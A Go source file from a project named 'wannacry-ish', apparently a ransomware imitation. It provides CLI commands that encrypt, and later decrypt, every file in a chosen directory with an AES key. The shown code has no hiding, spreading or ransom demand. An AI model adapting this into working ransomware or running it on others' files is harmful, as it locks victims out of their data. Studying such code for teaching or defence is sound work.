package command

import (
	"crypto/rsa"
	"fmt"
	"os"

	"github.com/J4NN0/wannacry-ish/internal/crypto"
	"github.com/spf13/cobra"
)

type Cmd struct {
	Directory     string
	aesKey        []byte
	rsaPrivateKey *rsa.PrivateKey
	rsaPublicKey  *rsa.PublicKey
}

func New(aesKey []byte, rsaPrivateKey *rsa.PrivateKey, rsaPublicKey *rsa.PublicKey) *Cmd {
	return &Cmd{
		aesKey:        aesKey,
		rsaPrivateKey: rsaPrivateKey,
		rsaPublicKey:  rsaPublicKey,
	}
}

func (c *Cmd) EncryptCmdRun(cmd *cobra.Command, args []string) {
	if c.Directory == "" {
		fmt.Println("Please specify a directory using the -d or --directory flag.")
		os.Exit(1)
	}

	filePaths, err := readFilesInDir(c.Directory)
	if err != nil {
		fmt.Printf("Error reading dire: %v\n", err)
		os.Exit(1)
	}
	if len(filePaths) == 0 {
		fmt.Printf("No files found. Nothing to process")
		os.Exit(0)
	}

	fmt.Printf("Found %d file in %s directory. Encrypting ...\n", len(filePaths), c.Directory)
	success := 0
	for _, file := range filePaths {
		err = crypto.EncryptFile(file, c.aesKey)
		if err != nil {
			fmt.Printf("Failed to encrypt file %s: %v\n", file, err)
		} else {
			success++
		}
	}

	fmt.Printf("Successfully encrypted %d/%d files\n", success, len(filePaths))
}

func (c *Cmd) DecryptCmdRun(cmd *cobra.Command, args []string) {
	if c.Directory == "" {
		fmt.Println("Please specify a directory using the --directory flag.")
		os.Exit(1)
	}

	filePaths, err := readFilesInDir(c.Directory)
	if err != nil {
		fmt.Printf("Error reading dire: %v\n", err)
		os.Exit(1)
	}
	if len(filePaths) == 0 {
		fmt.Printf("No files found. Nothing to process")
		os.Exit(1)
	}

	fmt.Printf("Found %d file in %s directory. Decrypting ...\n", len(filePaths), c.Directory)
	success := 0
	for _, file := range filePaths {
		err = crypto.DecryptFile(file, c.aesKey)
		if err != nil {
			fmt.Printf("Error encrypting file: %v\n", err)
		} else {
			success++
		}
	}

	fmt.Printf("Successfully decrypted %d/%d files\n", success, len(filePaths))
}
